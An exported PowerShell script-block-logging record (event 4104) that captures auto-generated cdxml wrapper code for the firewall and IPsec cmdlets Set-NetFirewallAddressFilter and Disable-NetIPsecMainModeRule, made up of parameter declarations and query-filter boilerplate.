    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('Query (cdxml)', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalAddress')) {
            [object]$__cmdletization_value = ${LocalAddress}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteAddress')) {
            [object]$__cmdletization_value = ${RemoteAddress}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallAddressFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallAddressFilter' -Alias '*'
        


ScriptBlock ID: 57d0416a-a976-42f6-9b1a-0c9452fc1de8
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (9 of 9):
ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEMMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MainModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MainModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('MainModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetMainModeRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetMainModeRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetMainModeRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeCryptoSet') -and (@('ByAssociatedNetIPsecMainModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeCryptoSet}, 'MSFT_NetMainModeRuleMMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Disable', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Disable-NetIPsecMainModeRule' -Alias '*'
        


ScriptBlock ID: 4cfc0bc4-892a-446d-8c97-3f4fcceb24f0
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (8 of 9):
   [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MainModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MainModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('MainModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetMainModeRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetMainModeRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetMainModeRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeCryptoSet') -and (@('ByAssociatedNetIPsecMainModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeCryptoSet}, 'MSFT_NetMainModeRuleMMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
